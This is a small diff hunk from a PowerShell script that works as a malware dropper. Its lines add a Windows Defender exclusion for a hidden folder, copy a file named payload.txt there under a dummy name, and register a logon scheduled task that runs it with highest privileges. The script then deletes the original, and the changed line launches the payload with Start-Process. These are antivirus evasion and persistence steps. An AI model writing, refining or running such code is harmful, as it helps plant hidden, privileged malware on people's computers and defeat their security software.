@@ -25,6 +25,6 @@ Add-MpPreference -ExclusionPath "$hidden_path"
 Copy-Item "$env:USERPROFILE\payload.txt" -Destination "$hidden_path\$dummy_name"
 schtasks /create /tn $dummy_name_no_exe /tr "$hidden_path\$dummy_name" /sc onlogon /rl HIGHEST /f
 Remove-Item "$env:USERPROFILE\payload.txt"
-.\$hidden_path\$dummy_name
+Start-Process -FilePath "$hidden_path\$dummy_name"
 
 pause
